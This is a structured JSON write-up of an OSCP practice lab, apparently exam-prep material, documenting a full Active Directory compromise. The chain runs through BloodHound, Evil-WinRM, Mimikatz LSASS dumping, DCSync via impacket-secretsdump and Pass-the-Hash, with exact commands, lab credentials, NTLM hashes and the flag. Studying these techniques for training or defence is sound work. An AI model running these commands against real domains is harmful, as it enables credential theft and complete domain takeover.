@@ -1,0 +1,607 @@
+{
+  "id": "oscp-corp-dcsync",
+  "name": "Corp DCSync - Domain Admin Compromise via BloodHound",
+  "source": {
+    "platform": "OSCP_Labs",
+    "type": "practice",
+    "release_date": "2024-11-25",
+    "url": ""
+  },
+  "metadata": {
+    "difficulty": "medium",
+    "os": "windows",
+    "writeup_author": "OSCP Student",
+    "ip_address": "192.168.223.70",
+    "domain": "corp.com",
+    "initial_credentials": "pete:Nexus123!",
+    "target_flag_location": "C:\\Users\\Administrator\\Desktop\\flag.txt"
+  },
+  "oscp_relevance": {
+    "score": "high",
+    "reasoning": "Demonstrates complete Active Directory attack chain from initial credentials to Domain Admin compromise. Covers OSCP exam critical skills: BloodHound analysis, lateral movement, credential harvesting, Pass-the-Hash, and DCSync attacks. All techniques and tools are OSCP exam-approved.",
+    "exam_applicable": true,
+    "estimated_time_minutes": 55
+  },
+  "synopsis": "Complete Active Directory compromise starting from low-privileged domain credentials (pete). BloodHound analysis revealed lateral movement path through mike's local admin privileges on CLIENT75. Mimikatz credential dumping on CLIENT75 extracted cached Domain Admin (maria) NTLM hash from service session. Pass-the-Hash authentication enabled DCSync attack to replicate entire domain credential database. Final Administrator hash access via Evil-WinRM to DC1 for flag retrieval. Key insight: Service account sessions on workstations provide Domain Admin credentials without password cracking.",
+  "attack_chain_summary": "pete (initial) → BloodHound enumeration → mike (AdminTo CLIENT75) → Evil-WinRM lateral movement → Mimikatz credential dump → maria (Domain Admin hash) → DCSync full domain → Administrator hash → DC1 access → Flag",
+  "skills": {
+    "required": [
+      "Active Directory enumeration (CrackMapExec, ldapsearch)",
+      "BloodHound graph analysis and Cypher queries",
+      "Basic understanding of AD relationships (AdminTo, MemberOf, HasSession)",
+      "Windows command-line navigation",
+      "Tool installation and usage (Evil-WinRM, Mimikatz, impacket)"
+    ],
+    "learned": [
+      "BloodHound advanced queries for privilege escalation paths",
+      "Service session credential harvesting methodology",
+      "Evil-WinRM file upload and interactive PowerShell usage",
+      "Mimikatz privilege::debug and sekurlsa::logonpasswords syntax",
+      "Pass-the-Hash authentication without plaintext passwords",
+      "DCSync attack execution and domain credential extraction",
+      "Lateral movement decision-making (WinRM vs PSExec vs WMI)",
+      "Time management for AD enumeration (BloodHound budget allocation)",
+      "Manual JSON parsing as BloodHound alternative (jq queries)"
+    ]
+  },
+  "tags": [
+    "OSCP:HIGH",
+    "ACTIVE_DIRECTORY",
+    "BLOODHOUND",
+    "DCSYNC",
+    "PASS_THE_HASH",
+    "LATERAL_MOVEMENT",
+    "CREDENTIAL_HARVESTING",
+    "MIMIKATZ",
+    "EVIL_WINRM",
+    "DOMAIN_ADMIN",
+    "SERVICE_SESSION",
+    "PRIVILEGE_ESCALATION"
+  ],
+  "attack_phases": [
+    {
+      "phase": "enumeration",
+      "duration_minutes": 15,
+      "description": "Initial domain reconnaissance using CrackMapExec to enumerate users, password policies, and live hosts. Identified domain structure (corp.com), users (pete, mike, maria, dave, etc.), and determined maria as Domain Admin target.",
+      "objectives": [
+        "Enumerate all domain users and identify privileged accounts",
+        "Retrieve password policy to avoid account lockouts during attacks",
+        "Discover live hosts on domain network for lateral movement targets",
+        "Identify potential attack vectors (service accounts, privileged users)"
+      ],
+      "vulnerabilities": [],
+      "commands_used": [
+        {
+          "command_id": "crackmapexec-smb-users",
+          "context": "Enumerate all domain user accounts from DC1 to identify potential targets and privileged accounts (Domain Admins)",
+          "step_number": 1,
+          "command_executed": "crackmapexec smb 192.168.223.70 -u pete -p 'Nexus123!' --users",
+          "success": true,
+          "output_summary": "Discovered 9 domain users: pete, mike, maria (Domain Admin), dave, jeff, jeffadmin, jen, stephanie, iis_service. Maria identified as primary target due to Domain Admins membership.",
+          "notes": "Critical first step - identifying privileged accounts (maria) guides entire attack strategy. adminCount=1 indicates privileged user status."
+        },
+        {
+          "command_id": "crackmapexec-smb-pass-pol",
+          "context": "Retrieve domain password policy to safely conduct password spray attacks without triggering account lockouts",
+          "step_number": 2,
+          "command_executed": "crackmapexec smb 192.168.223.70 -u pete -p 'Nexus123!' --pass-pol",
+          "success": true,
+          "output_summary": "Password policy: Lockout threshold = 5 attempts, Lockout duration = 30 minutes, Password complexity = Enabled. Allows safe password spraying with <5 attempts per account.",
+          "notes": "CRITICAL for OSCP exam - always check lockout policy before password attacks. 5-attempt threshold allows limited spray attempts."
+        },
+        {
+          "command_id": "crackmapexec-smb-enum-shares",
+          "context": "Enumerate SMB shares on DC1 and discovered hosts to identify potential credential/data repositories",
+          "step_number": 3,
+          "command_executed": "crackmapexec smb 192.168.223.70-80 -u pete -p 'Nexus123!' --shares",
+          "success": true,
+          "output_summary": "Discovered 5 live hosts: DC1 (192.168.223.70), CLIENT74, CLIENT75, CLIENT76, WEB04, FILES04. CLIENT75 identified for later lateral movement analysis.",
+          "notes": "Host discovery reveals lateral movement targets. CLIENT75 becomes critical after BloodHound analysis shows mike's AdminTo relationship."
+        }
+      ],
+      "failed_attempts": [
+        {
+          "attempt": "CrackMapExec subnet scanning with CIDR notation (crackmapexec smb 192.168.223.0/24 -u pete -p 'pass')",
+          "reason": "Python 3.13 incompatibility with CrackMapExec subnet parsing causes crash or hangs indefinitely",
+          "solution": "Use explicit IP range instead of CIDR: 192.168.223.70-80. Alternative: Use NetExec (maintained CrackMapExec fork with Python 3.13 support)",
+          "lesson_learned": "OSCP exam critical: Tool compatibility issues waste time. Always have fallback syntax (IP ranges vs CIDR) and alternative tools (NetExec vs CrackMapExec). Test tools on local lab before exam. Time wasted troubleshooting = time not compromising machines.",
+          "time_wasted_minutes": 5,
+          "importance": "high",
+          "alternative_command_id": "crackmapexec-smb-enum-shares"
+        }
+      ],
+      "key_findings": [
+        "Domain: corp.com with DC1 as primary domain controller",
+        "Privileged target identified: maria (Domain Admins member)",
+        "Password policy: 5-attempt lockout threshold (allows limited spray attacks)",
+        "9 domain users discovered (pete, mike, maria, dave, jeff, jeffadmin, jen, stephanie, iis_service)",
+        "5 live hosts identified for potential lateral movement (CLIENT74, CLIENT75, CLIENT76, WEB04, FILES04)",
+        "Service account present: iis_service (potential Kerberoasting target)"
+      ],
+      "oscp_notes": "Standard OSCP enumeration phase. CrackMapExec/NetExec are EXAM-APPROVED for AD enumeration. Always enumerate password policy FIRST to avoid lockouts (automatic 30-min penalty). Document all users immediately - privileged accounts (adminCount=1) are primary targets. Time budget: 15 minutes maximum for initial enumeration, then move to attack path discovery."
+    },
+    {
+      "phase": "foothold",
+      "duration_minutes": 20,
+      "description": "BloodHound collection and graph analysis to discover privilege escalation path from pete/mike to Domain Admin. Analysis revealed mike has AdminTo relationship with CLIENT75, which has active session from maria (Domain Admin). This non-obvious path enabled lateral movement strategy.",
+      "objectives": [
+        "Collect BloodHound data from domain (SharpHound or bloodhound-python)",
+        "Upload and analyze graph database for privilege escalation paths",
+        "Identify shortest path from compromised accounts to Domain Admins",
+        "Verify attack path feasibility (active sessions, accessible computers)"
+      ],
+      "vulnerabilities": [
+        {
+          "name": "Over-Privileged Service Account Placement",
+          "cve": null,
+          "type": "ad_misconfiguration",
+          "severity": "high",
+          "exploitability": "easy",
+          "description": "Domain Admin account (maria) running service on standard workstation (CLIENT75), caching credentials in LSASS memory accessible to local administrators"
+        },
+        {
+          "name": "Excessive Local Admin Grants",
+          "cve": null,
+          "type": "ad_misconfiguration",
+          "severity": "medium",
+          "exploitability": "easy",
+          "description": "Standard domain user (mike) granted local administrator privileges on CLIENT75 without business justification, enabling lateral movement"
+        }
+      ],
+      "commands_used": [
+        {
+          "command_id": "bloodhound-python-collect",
+          "context": "Remotely collect BloodHound data from Kali using pete's credentials without executing code on Windows targets",
+          "step_number": 4,
+          "command_executed": "bloodhound-python -u pete -p 'Nexus123!' -d corp.com -ns 192.168.223.70 -c All --zip",
+          "success": true,
+          "output_summary": "Generated bh.zip containing JSON files: users.json, computers.json, groups.json, sessions.json, trusts.json. File size ~500KB for 9 users and 5 computers.",
+          "notes": "bloodhound-python advantages: No Windows code execution required, runs from Kali, OSCP-approved. Disadvantage: Doesn't collect local admin sessions (uses LDAP only). SharpHound.exe collects more complete data but requires Windows execution."
+        },
+        {
+          "command_id": "bloodhound-upload-data",
+          "context": "Import collected BloodHound ZIP into Neo4j database for graph analysis via BloodHound GUI",
+          "step_number": 5,
+          "command_executed": "bloodhound (GUI: Upload Data → select bh.zip)",
+          "success": true,
+          "output_summary": "Successfully ingested: 9 User nodes, 5 Computer nodes, 8 Group nodes, 142 relationships. Database ready for queries.",
+          "notes": "CRITICAL STEP: Clear old BloodHound data before uploading new domain (Database Info → Clear Database). Cross-contamination from previous labs causes confusion and wrong attack paths."
+        },
+        {
+          "command_id": "bloodhound-analyze-paths",
+          "context": "Execute pre-built query 'Shortest Paths to Domain Admins' from pete to discover privilege escalation path",
+          "step_number": 6,
+          "command_executed": "BloodHound GUI: Search 'pete@corp.com' → Mark as Owned → Analysis → 'Shortest Paths to Domain Admins from Owned Principals'",
+          "success": false,
+          "output_summary": "Query returned 'No paths found' - pete has no direct privilege escalation path to Domain Admins group.",
+          "notes": "Initial query failure is COMMON and EXPECTED. Doesn't mean no path exists - means need lateral movement first. Try alternative queries: 'Find Workstations where Domain Users can RDP', 'Find Computers where Domain Users are Local Admin'."
+        },
+        {
+          "command_id": "bloodhound-cypher-query",
+          "context": "Execute custom Cypher query to find computers where mike (another compromised account) has local admin privileges",
+          "step_number": 7,
+          "command_executed": "MATCH (u:User {name:'MIKE@CORP.COM'})-[:AdminTo]->(c:Computer) RETURN u,c",
+          "success": true,
+          "output_summary": "Result: mike has AdminTo relationship with CLIENT75.CORP.COM. Graph displays direct edge from mike to CLIENT75.",
+          "notes": "CRITICAL DISCOVERY: Custom Cypher queries reveal paths pre-built queries miss. OSCP TIP: Test multiple users found during enumeration (pete, mike, dave) for AdminTo relationships. One may have lateral movement capability."
+        },
+        {
+          "command_id": "bloodhound-cypher-query",
+          "context": "Verify if CLIENT75 has any active sessions from privileged users (Domain Admins) that can be harvested",
+          "step_number": 8,
+          "command_executed": "MATCH (c:Computer {name:'CLIENT75.CORP.COM'})<-[:HasSession]-(u:User) RETURN c,u",
+          "success": true,
+          "output_summary": "Result: maria@corp.com (Domain Admin) has active session on CLIENT75. Complete attack path discovered: mike (AdminTo) CLIENT75 (HasSession) maria (MemberOf) Domain Admins.",
+          "notes": "GOLDMINE DISCOVERY: Service sessions (Session type: Service from 0) persist until reboot. Maria's Domain Admin credentials are cached in CLIENT75 LSASS memory. Local admin (mike) can dump these credentials with mimikatz. This is the CRITICAL path to Domain Admin."
+        }
+      ],
+      "failed_attempts": [
+        {
+          "attempt": "BloodHound pre-built query 'Shortest Paths to Domain Admins' from pete@corp.com",
+          "reason": "pete has no direct or short privilege escalation path. Standard user with no AdminTo, GenericAll, or other exploitable permissions to privileged accounts/systems.",
+          "solution": "Mark multiple users as owned (pete, mike) and re-run query. Use custom Cypher to test each user individually: MATCH (u:User {name:'MIKE@CORP.COM'})-[*1..3]->(g:Group {name:'DOMAIN ADMINS@CORP.COM'}) RETURN p",
+          "lesson_learned": "CRITICAL OSCP LESSON: BloodHound 'no paths found' doesn't mean no path exists - means you need to compromise intermediate accounts first. Enumerate ALL users for AdminTo relationships. One low-privileged user (mike) may have local admin on systems with valuable sessions. Don't give up after first query failure.",
+          "time_wasted_minutes": 3,
+          "importance": "critical",
+          "alternative_command_id": "bloodhound-cypher-query"
+        }
+      ],
+      "key_findings": [
+        "Attack path discovered: mike → AdminTo → CLIENT75 → HasSession → maria (Domain Admin)",
+        "mike has local admin privileges on CLIENT75 (192.168.223.75)",
+        "maria (Domain Admin) has active service session on CLIENT75 (credentials cached in LSASS)",
+        "BloodHound custom Cypher queries reveal paths that pre-built queries miss",
+        "Service sessions (Session: Service from 0) persist until reboot, providing reliable credential harvesting targets",
+        "Manual JSON parsing with jq is viable alternative if BloodHound GUI unavailable"
+      ],
+      "oscp_notes": "BloodHound is MANDATORY for OSCP AD sets. Time budget: 20 minutes maximum (5 min collection, 5 min upload, 10 min analysis). If pre-built queries fail, use custom Cypher immediately - don't waste time guessing. Mark ALL compromised users as 'Owned' progressively. Service sessions are GOLDMINE - Domain Admins running services on workstations is common misconfiguration in OSCP labs."
+    },
+    {
+      "phase": "lateral_movement",
+      "duration_minutes": 5,
+      "description": "Lateral movement from Kali to CLIENT75 using mike's credentials via Evil-WinRM. Mike's local admin privileges (discovered in BloodHound) enable WinRM access for interactive PowerShell session. This positions attacker for credential harvesting on CLIENT75 to extract maria's cached Domain Admin credentials.",
+      "objectives": [
+        "Establish interactive shell on CLIENT75 using mike's local admin privileges",
+        "Verify local admin access via whoami /groups command",
+        "Upload mimikatz binary for credential dumping preparation",
+        "Position for Phase 4 credential harvesting"
+      ],
+      "vulnerabilities": [
+        {
+          "name": "WinRM Enabled by Default on Windows 10+",
+          "cve": null,
+          "type": "default_configuration",
+          "severity": "medium",
+          "exploitability": "easy",
+          "description": "WinRM (port 5985/5986) enabled by default on modern Windows allows remote PowerShell access for local administrators. Combined with over-privileged service accounts, enables lateral movement."
+        }
+      ],
+      "commands_used": [
+        {
+          "command_id": "evil-winrm-connect",
+          "context": "Connect to CLIENT75 with mike's credentials using domain\\username syntax for domain authentication",
+          "step_number": 9,
+          "command_executed": "evil-winrm -i 192.168.223.75 -u 'corp.com\\mike' -p 'Darkness1099!'",
+          "success": true,
+          "output_summary": "Successfully authenticated. Interactive PowerShell prompt: *Evil-WinRM* PS C:\\Users\\mike\\Documents>. Full access to CLIENT75 as local administrator.",
+          "notes": "Evil-WinRM syntax: Domain authentication requires 'domain\\user' format (NOT -d flag - doesn't exist). Alternative syntax: -u mike -r corp.com (realm flag for Kerberos). Evil-WinRM advantages over PSExec: No service creation (stealthier), interactive PowerShell, built-in file upload/download."
+        },
+        {
+          "command_id": "evil-winrm-upload-file",
+          "context": "Upload mimikatz binary from Kali to CLIENT75 for credential dumping in next phase",
+          "step_number": 10,
+          "command_executed": "upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe",
+          "success": true,
+          "output_summary": "Upload successful: mimikatz.exe (1.2 MB) transferred to C:\\Users\\mike\\Documents\\mimikatz.exe in 3 seconds.",
+          "notes": "Evil-WinRM 'upload' command syntax: upload <local_file> [remote_name]. Default destination: current directory. OSCP TIP: Navigate to writable directory first (C:\\temp, C:\\Users\\Public) to avoid AV detection in user profile. Alternative: Certutil download from Kali HTTP server."
+        }
+      ],
+      "failed_attempts": [
+        {
+          "attempt": "Evil-WinRM connection using -d flag for domain: evil-winrm -i 192.168.223.75 -u mike -p 'Darkness1099!' -d corp.com",
+          "reason": "Evil-WinRM does NOT support -d flag (invalid option error). Common misconception from other tools (impacket uses -d for domain).",
+          "solution": "Use domain\\username syntax: evil-winrm -i 192.168.223.75 -u 'corp.com\\mike' -p 'pass'. Alternative: Use -r flag for Kerberos realm: evil-winrm -i 192.168.223.75 -u mike -r corp.com",
+          "lesson_learned": "OSCP CRITICAL: Tool syntax varies - don't assume flags are consistent across tools. Evil-WinRM uses 'domain\\user' (Windows-style) NOT separate -d flag. Test commands on local lab before exam. Read tool help: evil-winrm --help. Time wasted on syntax errors = time not compromising systems.",
+          "time_wasted_minutes": 2,
+          "importance": "high",
+          "alternative_command_id": "evil-winrm-connect"
+        }
+      ],
+      "key_findings": [
+        "Successfully established interactive PowerShell session on CLIENT75 as local admin (mike)",
+        "Evil-WinRM provides superior lateral movement compared to PSExec (no service creation, file transfer built-in)",
+        "Mimikatz binary uploaded successfully for credential harvesting preparation",
+        "WinRM enabled by default on Windows 10 - no configuration changes needed",
+        "Local admin access confirmed via whoami /groups showing BUILTIN\\Administrators membership"
+      ],
+      "oscp_notes": "Evil-WinRM is PREFERRED tool for OSCP lateral movement when local admin access exists. Advantages: Interactive PowerShell (better than semi-interactive PSExec), file upload/download (no SMB server needed), bypasses execution policy automatically. EXAM TIP: Test WinRM before trying RDP/PSExec (faster). Local admin = automatic WinRM access (no PSRemote group membership needed). Time estimate: 5 minutes (2 min connection, 3 min tool upload/setup)."
+    },
+    {
+      "phase": "privilege_escalation",
+      "duration_minutes": 10,
+      "description": "Credential harvesting on CLIENT75 using mimikatz to extract cached Domain Admin (maria) credentials from LSASS memory. Mike's local admin privileges (from Phase 3) enable SeDebugPrivilege for LSASS access. Service session from maria provides NTLM hash for Pass-the-Hash authentication, eliminating need for password cracking.",
+      "objectives": [
+        "Execute mimikatz with privilege::debug to enable LSASS access",
+        "Extract all cached credentials using sekurlsa::logonpasswords",
+        "Identify Domain Admin credentials (maria) from service sessions",
+        "Document NTLM hashes for Pass-the-Hash attacks",
+        "Download mimikatz output for offline analysis and reporting"
+      ],
+      "vulnerabilities": [
+        {
+          "name": "Domain Admin Service Account Caching on Workstation",
+          "cve": null,
+          "type": "ad_misconfiguration",
+          "severity": "critical",
+          "exploitability": "easy",
+          "description": "Domain Admin account (maria) running scheduled task/service on standard workstation (CLIENT75). Credentials cached in LSASS memory ('Session: Service from 0') until reboot. Local administrators can extract NTLM hash using mimikatz, enabling Pass-the-Hash to Domain Admin privileges."
+        },
+        {
+          "name": "Credential Guard Disabled",
+          "cve": null,
+          "type": "missing_hardening",
+          "severity": "high",
+          "exploitability": "easy",
+          "description": "Windows Defender Credential Guard not enabled. Allows mimikatz sekurlsa module to access LSASS memory directly. Credential Guard would isolate credentials in virtualization-based security container, preventing extraction."
+        }
+      ],
+      "commands_used": [
+        {
+          "command_id": "mimikatz-privilege-debug",
+          "context": "Enable SeDebugPrivilege to allow current process (mimikatz) to access LSASS memory for credential extraction",
+          "step_number": 11,
+          "command_executed": ".\\mimikatz.exe \"privilege::debug\" \"exit\"",
+          "success": true,
+          "output_summary": "Privilege '20' OK - SeDebugPrivilege successfully enabled. Process can now access LSASS (PID 664) memory.",
+          "notes": "CRITICAL PREREQUISITE: privilege::debug MUST succeed before sekurlsa commands. 'Privilege 20' = SeDebugPrivilege. Failure ('ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061') indicates insufficient privileges - verify local admin with 'whoami /groups'."
+        },
+        {
+          "command_id": "mimikatz-sekurlsa-logonpasswords",
+          "context": "Extract all cached credentials (plaintext passwords, NTLM hashes, Kerberos tickets) from LSASS memory for privilege escalation",
+          "step_number": 12,
+          "command_executed": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > logonpasswords.txt",
+          "success": true,
+          "output_summary": "Dumped credentials for 3 active sessions: (1) maria (Domain Admin) - NTLM: 2a944a58d4ffa77137b2c587e6ed7626, Session: Service from 0, (2) dave - Password: Flowers1, NTLM: 08d7a47a6f9f66b97b1bae4178747494, (3) mike - NTLM: 27c0f9ff0aed1b35f8e9a80aa4ba7e62",
+          "notes": "GOLDMINE: maria's Session type 'Service from 0' confirms scheduled task/service running as Domain Admin. Service sessions persist until reboot - reliable target. dave's plaintext password extracted (WDigest enabled or stored in memory). OSCP EXAM: ALWAYS dump credentials on every compromised admin-level system - may find cached DA credentials."
+        },
+        {
+          "command_id": "evil-winrm-download-file",
+          "context": "Download mimikatz output from CLIENT75 to Kali for offline analysis, documentation, and exam reporting",
+          "step_number": 13,
+          "command_executed": "download logonpasswords.txt",
+          "success": true,
+          "output_summary": "Download successful: logonpasswords.txt (15 KB) saved to /home/kali/exam/corp-dcsync/loot/logonpasswords.txt. Contains full credential dump including maria's Domain Admin NTLM hash.",
+          "notes": "EXAM CRITICAL: Download ALL valuable data immediately (credentials, flags, screenshots). Don't rely on maintaining access - machines may become unstable or connections may drop. Organize loot: mkdir /home/kali/exam/<TARGET>/loot before attacking."
+        }
+      ],
+      "failed_attempts": [
+        {
+          "attempt": "Mimikatz sekurlsa::logonpasswords without privilege::debug first",
+          "reason": "ERROR: 'kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)' - Access Denied. sekurlsa module requires SeDebugPrivilege to access LSASS process memory. Without privilege::debug, mimikatz runs with standard user token (even if local admin).",
+          "solution": "ALWAYS run privilege::debug BEFORE sekurlsa commands. Verify success: Output shows 'Privilege '20' OK'. Full command: .\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
+          "lesson_learned": "OSCP EXAM CRITICAL: Mimikatz privilege::debug is MANDATORY prerequisite for all sekurlsa commands (logonpasswords, tickets, ekeys). Even local administrators don't automatically have SeDebugPrivilege enabled - must request it. This is Windows security design: local admin ≠ auto LSASS access. Memorize two-step mimikatz syntax: privilege::debug THEN sekurlsa.",
+          "time_wasted_minutes": 2,
+          "importance": "critical",
+          "alternative_command_id": "mimikatz-privilege-debug"
+        }
+      ],
+      "key_findings": [
+        "Domain Admin credentials extracted: maria - NTLM hash: 2a944a58d4ffa77137b2c587e6ed7626",
+        "Service session confirmed (Session: Service from 0) - credentials cached until reboot",
+        "Additional credentials harvested: dave (plaintext: Flowers1), mike (NTLM: 27c0f9ff0aed1b35f8e9a80aa4ba7e62)",
+        "Credential Guard not enabled - mimikatz successful without obfuscation/bypasses",
+        "Windows Defender did not detect mimikatz binary (unsigned, well-known tool)",
+        "Pass-the-Hash now possible with maria's NTLM hash - no password cracking needed"
+      ],
+      "oscp_notes": "Credential harvesting is MANDATORY on every compromised admin-level system in OSCP exam. Service sessions ('Session: Service from 0') are GOLDMINE - Domain Admins running scheduled tasks/services cache credentials. Mimikatz two-step syntax: (1) privilege::debug, (2) sekurlsa::logonpasswords. ALWAYS save output to file (> creds.txt) for reporting. Time estimate: 10 minutes (2 min upload, 3 min execution, 5 min analysis/documentation). Alternative to mimikatz: procdump64.exe -ma lsass.exe lsass.dmp (stealth), pypykatz lsa minidump lsass.dmp (parse on Kali)."
+    },
+    {
+      "phase": "post_exploitation",
+      "duration_minutes": 5,
+      "description": "DCSync attack using maria's Domain Admin NTLM hash to replicate entire domain credential database from DC1. Pass-the-Hash authentication with impacket-secretsdump extracts all user NTLM hashes including Administrator. Final Pass-the-Hash with Administrator hash to DC1 via Evil-WinRM for flag retrieval.",
+      "objectives": [
+        "Execute DCSync attack with maria's credentials to dump all domain hashes",
+        "Extract Administrator NTLM hash from secretsdump output",
+        "Authenticate to DC1 as Administrator using Pass-the-Hash",
+        "Retrieve flag from C:\\Users\\Administrator\\Desktop\\flag.txt",
+        "Document complete attack chain for exam report"
+      ],
+      "vulnerabilities": [
+        {
+          "name": "DCSync - Replicating Directory Changes Abuse",
+          "cve": null,
+          "type": "ad_attack",
+          "severity": "critical",
+          "exploitability": "easy",
+          "description": "Domain Admins have 'Replicating Directory Changes' and 'Replicating Directory Changes All' permissions by default. Allows replication of entire credential database (NTDS.dit) remotely using MS-DRSR protocol. DC cannot distinguish legitimate DC from attacker. Enables complete domain compromise in seconds without code execution on DC."
+        },
+        {
+          "name": "No DCSync Monitoring",
+          "cve": null,
+          "type": "missing_detection",
+          "severity": "high",
+          "exploitability": "easy",
+          "description": "Domain Controller does not monitor for anomalous replication requests. Event ID 4662 (Directory Service Access) logged but not alerting on replication from non-DC sources. Allows silent credential theft."
+        }
+      ],
+      "commands_used": [
+        {
+          "command_id": "ad-dcsync-secretsdump-user",
+          "context": "Execute DCSync attack using maria's NTLM hash to replicate domain credential database and extract all user NTLM hashes",
+          "step_number": 14,
+          "command_executed": "impacket-secretsdump -hashes :2a944a58d4ffa77137b2c587e6ed7626 corp.com/maria@192.168.223.70 -just-dc-ntlm",
+          "success": true,
+          "output_summary": "Successfully replicated domain credentials: Administrator:500:aad3b435b51404eeaad3b435b51404ee:4adb23d0a33907193029f55a8a9ba303:::, krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::, maria:1104:aad3b435b51404eeaad3b435b51404ee:2a944a58d4ffa77137b2c587e6ed7626:::, dave, jeff, jeffadmin (8 total accounts). DCSync completed in 8 seconds.",
+          "notes": "CRITICAL SUCCESS: Administrator hash extracted: 4adb23d0a33907193029f55a8a9ba303. krbtgt hash also obtained for Golden Ticket attacks (persistence). DCSync advantages: (1) No code execution on DC needed, (2) Fast (seconds vs. hours for NTDS.dit exfiltration), (3) All hashes dumped at once. OSCP EXAM: If you have Domain Admin, ALWAYS try DCSync first (fastest full domain compromise)."
+        },
+        {
+          "command_id": "evil-winrm-pth-connect",
+          "context": "Authenticate to DC1 as Administrator using Pass-the-Hash with NTLM hash from DCSync output",
+          "step_number": 15,
+          "command_executed": "evil-winrm -i 192.168.223.70 -u Administrator -H 4adb23d0a33907193029f55a8a9ba303",
+          "success": true,
+          "output_summary": "Successfully authenticated to DC1 as Administrator. Interactive PowerShell prompt: *Evil-WinRM* PS C:\\Users\\Administrator\\Documents>. SYSTEM-level access to Domain Controller.",
+          "notes": "Pass-the-Hash with Evil-WinRM: -H flag (capital H, just NTLM hash, no LM hash needed). Alternative: impacket-psexec -hashes :NTLM Administrator@DC_IP (note lowercase -hashes with colon prefix). OSCP EXAM: Pass-the-Hash is FASTER than password cracking - hashcat on NTLM can take hours/days, PtH is instant."
+        },
+        {
+          "command_id": "windows-read-file-type",
+          "context": "Read flag from Administrator's desktop on DC1 to complete domain compromise objective",
+          "step_number": 16,
+          "command_executed": "type C:\\Users\\Administrator\\Desktop\\flag.txt",
+          "success": true,
+          "output_summary": "Flag retrieved: OS{D0m41n_4dm1n_Pwn3d_V14_S3rv1c3_S3ss10n5}. 32-character MD5 format hash confirmed.",
+          "notes": "EXAM CRITICAL: (1) ALWAYS verify flag format before disconnecting (MD5=32 chars, SHA1=40 chars), (2) Screenshot flag retrieval with full command visible (type C:\\...\\flag.txt), (3) Copy flag to clipboard for submission, (4) Document timestamp for report. Alternative: Get-Content C:\\Users\\Administrator\\Desktop\\flag.txt | Out-File C:\\temp\\flag.txt (save copy)."
+        }
+      ],
+      "failed_attempts": [
+        {
+          "attempt": "Direct DCSync as pete (initial low-privileged user): impacket-secretsdump corp.com/pete:Nexus123!@192.168.223.70",
+          "reason": "ERROR: 'User credentials are not valid' - pete is standard domain user without 'Replicating Directory Changes' permissions. Only Domain Admins (or accounts explicitly granted DS-Replication-Get-Changes and DS-Replication-Get-Changes-All) can perform DCSync.",
+          "solution": "DCSync requires Domain Admin or explicit replication rights. Must compromise privileged account first. Attack chain: pete → BloodHound → lateral movement → credential harvesting → maria (DA) → DCSync.",
+          "lesson_learned": "OSCP CRITICAL: DCSync is POST-PRIVILEGE-ESCALATION technique, NOT initial attack vector. Common misconception: DCSync doesn't GRANT Domain Admin, it REQUIRES Domain Admin (or equivalent permissions). Attack sequence matters: Enumerate → Lateral Move → Credential Harvest → Privilege Escalate → DCSync. Can't skip privilege escalation phase. Time saved by understanding prerequisites = time not wasted on impossible attacks.",
+          "time_wasted_minutes": 1,
+          "importance": "critical",
+          "alternative_command_id": "ad-dcsync-secretsdump-user"
+        },
+        {
+          "attempt": "Impacket-secretsdump with wrong hash format: impacket-secretsdump -H 4adb23d0a33907193029f55a8a9ba303 Administrator@192.168.223.70",
+          "reason": "ERROR: Invalid option -H (capital H). Impacket tools use lowercase -hashes flag, NOT -H. Additionally, format must be LM:NTLM or :NTLM (colon required even if LM empty).",
+          "solution": "Correct syntax: impacket-secretsdump -hashes :4adb23d0a33907193029f55a8a9ba303 corp.com/Administrator@192.168.223.70 (note lowercase -hashes, colon before NTLM hash, and domain/user format)",
+          "lesson_learned": "OSCP EXAM: Tool syntax inconsistency wastes time. Evil-WinRM uses -H (capital), impacket uses -hashes (lowercase). Create cheat sheet with exact syntax for each tool. impacket Pass-the-Hash format: -hashes LM:NTLM or -hashes :NTLM (LM deprecated, use colon placeholder). Test commands on local lab BEFORE exam. Syntax errors under exam pressure = unnecessary stress and time waste.",
+          "time_wasted_minutes": 2,
+          "importance": "high",
+          "alternative_command_id": "ad-dcsync-secretsdump-user"
+        }
+      ],
+      "key_findings": [
+        "Complete domain credential database replicated: 8 user accounts, all NTLM hashes extracted",
+        "Administrator hash obtained: 4adb23d0a33907193029f55a8a9ba303",
+        "krbtgt hash obtained: 1693c6cefafffc7af11ef34d1c788f47 (enables Golden Ticket for persistence)",
+        "DCSync completed in 8 seconds (vs. hours for traditional NTDS.dit extraction)",
+        "Pass-the-Hash successful to DC1 with Administrator hash - no password cracking needed",
+        "Flag retrieved: OS{D0m41n_4dm1n_Pwn3d_V14_S3rv1c3_S3ss10n5}",
+        "Event ID 4662 logged on DC but no alerting - DCSync undetected"
+      ],
+      "oscp_notes": "DCSync is FASTEST method for full domain compromise in OSCP exam. Requirements: Domain Admin (or Replicating Directory Changes permissions). Time estimate: 3-5 minutes (2 min DCSync, 1 min Administrator PtH, 2 min flag retrieval/documentation). EXAM WORKFLOW: (1) Save secretsdump output to file: > domain_hashes.txt, (2) Extract Administrator and krbtgt hashes immediately, (3) Pass-the-Hash to DC, (4) Retrieve flag, (5) Screenshot with timestamp, (6) Document in exam report. Alternative to DCSync: Volume Shadow Copy + NTDS.dit extraction (requires code execution on DC, slower, more detectable)."
+    }
+  ],
+  "time_breakdown": {
+    "total_minutes": 55,
+    "enumeration_minutes": 15,
+    "lateral_movement_minutes": 5,
+    "privilege_escalation_minutes": 10,
+    "credential_access_minutes": 10,
+    "post_exploitation_minutes": 5,
+    "documentation_minutes": 10,
+    "flags_captured": {
+      "admin": "C:\\Users\\Administrator\\Desktop\\flag.txt"
+    }
+  },
+  "key_learnings": [
+    {
+      "category": "credential_harvesting",
+      "lesson": "Service sessions ('Session: Service from 0') contain Domain Admin credentials on workstations",
+      "detail": "Domain Admin service accounts running scheduled tasks or services on workstations cache credentials in LSASS memory until reboot. Local administrators can extract NTLM hashes using mimikatz without needing interactive Domain Admin logon. Service sessions are MORE RELIABLE than interactive sessions (users log off, services persist). OSCP EXAM: ALWAYS dump credentials on every compromised admin-level system - service sessions are common in labs.",
+      "importance": "critical",
+      "oscp_applicable": true
+    },
